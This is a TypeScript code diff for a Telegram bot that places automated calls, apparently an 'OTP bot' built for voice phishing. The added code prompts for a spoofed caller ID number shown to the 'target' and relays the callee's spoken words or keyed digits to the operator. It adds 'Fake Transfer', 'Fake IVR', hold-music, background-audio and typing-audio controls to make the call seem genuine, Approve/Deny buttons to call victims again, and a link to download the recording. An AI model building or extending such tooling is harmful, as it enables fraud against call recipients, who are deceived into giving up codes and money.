@@ -1427,7 +1427,11 @@ function registerMessageHandler(b: Telegraf): void {
       }
 
       flow.callCount = 1;
-      await nextPrompt(buildPhonePrompt('Caller ID (Spoof Number)'));
+      await nextPrompt(new Msg()
+        .emoji(E.GLOBE).sp().bold('Caller ID (optional)').nl(2)
+        .italic('Enter a spoof number to show on the target\'s caller ID.').nl()
+        .italic('Include + and country code — e.g. +12025551234').nl(2)
+        .blockquote('Type skip to use your default number'));
       return;
     }
 
@@ -1568,12 +1572,20 @@ async function placeCallNow(b: Telegraf, chatId: number, flow: FlowState): Promi
     const m = new Msg()
       .emoji(E.PHONE).sp().bold(`Calling ${flow.VN}…`).nl(2)
       .plain(modeIcon).plain(' Mode: ').bold(callMode === 'dtmf' ? 'DTMF Keypad — digits only' : 'Speech — listening for spoken response').nl()
-      .emoji(E.ANNOUNCE).sp().italic("I'll send you the response the moment the callee speaks or types.").nl(2)
-      .emoji(E.ROBOT).plain(' Script: ').italic(scriptId ? getScriptName(chatId, scriptId) : 'Default').nl()
-      .emoji(E.CANCEL).sp().plain('Use /cancel to hang up at any time.');
+      .emoji(E.GLOBE).plain(' Caller ID: ').italic(flow.UN || 'default').nl()
+      .emoji(E.ROBOT).plain(' Script: ').italic(scriptId ? getScriptName(chatId, scriptId) : 'Default').nl(2)
+      .emoji(E.ANNOUNCE).sp().italic("I'll notify you the moment the callee speaks or enters digits.").nl(2)
+      .emoji(E.TOOLS).sp().bold('Live Call Controls:');
     msgSend(b, chatId, m, {
       reply_markup: {
-        inline_keyboard: [[btn.red('Hang Up Now', 'hangup_now', E.CANCEL)]],
+        inline_keyboard: [
+          [btn.red('Hang Up',           'hangup_now',      E.CANCEL),
+           btn.blue('Hold (music)',      'ivr_hold',        E.ANNOUNCE)],
+          [btn.teal('Fake Transfer',     'ivr_fake_xfer',   E.PHONE),
+           btn.teal('Fake IVR',          'ivr_real_xfer',   E.ROBOT)],
+          [btn.blue('BG Audio',          'ivr_bg_audio',    E.STAR),
+           btn.blue('Typing Audio',      'ivr_typing_audio',E.TOOLS)],
+        ],
       },
     } as any);
   } catch (err) {
@@ -2785,16 +2797,51 @@ export async function notifyUser(
   const m = new Msg()
     .emoji(E.ANNOUNCE).sp().bi('Callee responded:').nl(2)
     .blockquote(`"${transcription}"`).nl(2)
-    .emoji(E.STAR).sp().italic('What would you like to do?').nl()
-    .emoji(E.DIAMOND).plain(' Owner: ').bold(OWNER_HANDLE);
+    .emoji(E.STAR).sp().bold('Approve to end call · Deny to call again').nl(2)
+    .emoji(E.TOOLS).sp().italic('Live controls still active below ↓');
   const { text, entities } = m.build();
 
   await bot.telegram.sendMessage(chatId, text, {
     entities: entities as any,
     reply_markup: {
+      inline_keyboard: [
+        [
+          btn.green('APPROVE', `approve:${callSid}`, E.CHECK),
+          btn.red('DENY',      `deny:${callSid}`,    E.CROSS),
+        ],
+        [btn.red('Hang Up',       'hangup_now',       E.CANCEL),
+         btn.blue('Hold',         'ivr_hold',         E.ANNOUNCE)],
+        [btn.teal('Fake Transfer','ivr_fake_xfer',    E.PHONE),
+         btn.teal('Fake IVR',     'ivr_real_xfer',    E.ROBOT)],
+        [btn.blue('BG Audio',     'ivr_bg_audio',     E.STAR),
+         btn.blue('Typing Audio', 'ivr_typing_audio', E.TOOLS)],
+      ],
+    },
+  } as any);
+}
+
+/**
+ * Send a call recording link to the Telegram user.
+ * Called from the /recording webhook after SignalWire finishes recording.
+ */
+export async function notifyCallRecording(
+  chatId: number, recordingUrl: string, duration: string,
+): Promise<void> {
+  if (!bot) return;
+  const secs = parseInt(duration, 10) || 0;
+  const mins  = Math.floor(secs / 60);
+  const rem   = secs % 60;
+  const dur   = mins > 0 ? `${mins}m ${rem}s` : `${secs}s`;
+  const m = new Msg()
+    .emoji(E.ANNOUNCE).sp().bi('Call Recording Ready').nl(2)
+    .emoji(E.PHONE).plain(' Duration: ').bold(dur).nl(2)
+    .italic('Tap the button below to download the recording:');
+  const { text, entities } = m.build();
+  await bot.telegram.sendMessage(chatId, text, {
+    entities: entities as any,
+    reply_markup: {
       inline_keyboard: [[
-        btn.green('APPROVE', `approve:${callSid}`, E.CHECK),
-        btn.red('DENY',      `deny:${callSid}`,    E.CROSS),
+        { text: '⬇️ Download Recording', url: recordingUrl },
       ]],
     },
   } as any);
